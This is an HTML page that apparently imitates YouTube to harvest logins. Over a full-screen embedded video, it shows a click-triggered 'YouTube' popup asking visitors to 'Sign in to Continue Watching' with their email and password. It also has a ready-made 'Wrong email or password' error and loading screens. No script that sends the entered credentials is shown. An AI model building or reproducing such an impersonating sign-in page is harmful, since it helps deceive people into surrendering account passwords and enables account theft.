<!DOCTYPE html>

<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:Roboto,Arial,sans-serif;
  background:#000;
  overflow:hidden;
  color:#111;
}

/* ðŸŽ¥ FULLSCREEN VIDEO BACKGROUND */
.video-bg{
  position:fixed;
  inset:0;
  overflow:hidden;
  z-index:-2;
}
.video-bg iframe{
  position:absolute;
  top:50%;
  left:50%;
  width:120vw;
  height:120vh;
  transform:translate(-50%,-50%);
  pointer-events:none;
}
.video-overlay{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.45);
  z-index:-1;
}

/* click trigger */
#open-login{display:none}
.click-layer{
  position:fixed;
  inset:0;
  cursor:pointer;
  z-index:1;
}

/* popup */
.popup{
  position:fixed;
  inset:0;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:24px;
  background:rgba(0,0,0,.6);
  opacity:0;
  pointer-events:none;
  transition:.4s;
  z-index:2;
}
#open-login:checked ~ .popup{
  opacity:1;
  pointer-events:auto;
}

/* signup card */
.container{
  width:100%;
  max-width:360px;
  background:#fff;
  border-radius:12px;
  padding:34px 28px;
  box-shadow:0 20px 50px rgba(0,0,0,.5);
  text-align:center;
  transform:scale(.94);
  transition:.4s;
}
#open-login:checked ~ .popup .container{
  transform:scale(1);
}

.brand{
  font-size:22px;
  font-weight:700;
}
.subtitle{
  font-size:14px;
  color:#5f6368;
  margin:8px 0 10px;
}

input{
  width:100%;
  padding:12px;
  font-size:14px;
  border:1px solid #dadce0;
  border-radius:4px;
  margin-bottom:14px;
  text-align:left;
}
input:focus{
  border-color:#1a73e8;
  outline:none;
}

button{
  width:100%;
  padding:11px;
  background:#ff0000;
  color:#fff;
  border:none;
  border-radius:20px;
  font-size:14px;
  font-weight:500;
  cursor:pointer;
}
button:hover{background:#e60000}

.links{
  font-size:13px;
  margin-top:16px;
}
.links a{
  color:#1a73e8;
  text-decoration:none;
}

.error-message{
  display:none;
  color:#d93025;
  font-size:13px;
  margin-top:10px;
}

/* loader */
#page-loader{
  position:fixed;
  inset:0;
  background:#0f0f0f;
  display:flex;
  align-items:center;
  justify-content:center;
  z-index:9999;
}
#page-loader.fade-out{
  opacity:0;
  pointer-events:none;
  transition:.6s;
}
.loader{
  width:42px;
  height:42px;
  border:4px solid #333;
  border-top:4px solid #ff0000;
  border-radius:50%;
  animation:spin 1s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

.loading-overlay{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.9);
  display:none;
  align-items:center;
  justify-content:center;
  z-index:9998;
}
</style>
</head>
<body>

<!-- ðŸŽ¥ REAL YOUTUBE BACKGROUND (AUTOPLAY FIXED) -->
<div class="video-bg">
  <iframe
    src="https://www.youtube.com/embed/jalR5R5JqME?autoplay=0&mute=0&playsinline=1&loop=1&controls=0&rel=0&playlist=jalR5R5JqME"
    frameborder="0"
    allow="fullscreen">
  </iframe>
</div>
<div class="video-overlay"></div>

<!-- click trigger -->
<input type="checkbox" id="open-login">
<label for="open-login" class="click-layer"></label>

<!-- popup -->
<div class="popup">
  <div class="container" id="main-container">
    <div class="brand">YouTube</div>
    <div class="subtitle">Sign in to Continue Watching</div>
    <form id="login-form">
      <input type="email" id="email" placeholder="Email address" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Sign in</button>
      <div class="error-message" id="error-msg">Wrong email or password</div>
    </form>

    <div class="links">
      New to YouTube? <a href="#">Create account</a>
    </div>
  </div>
</div>

<!-- loaders -->
<div id="page-loader"><div class="loader"></div></div>
<div class="loading-overlay" id="loading-screen"><div class="loader"></div></div>

</body>
</html>
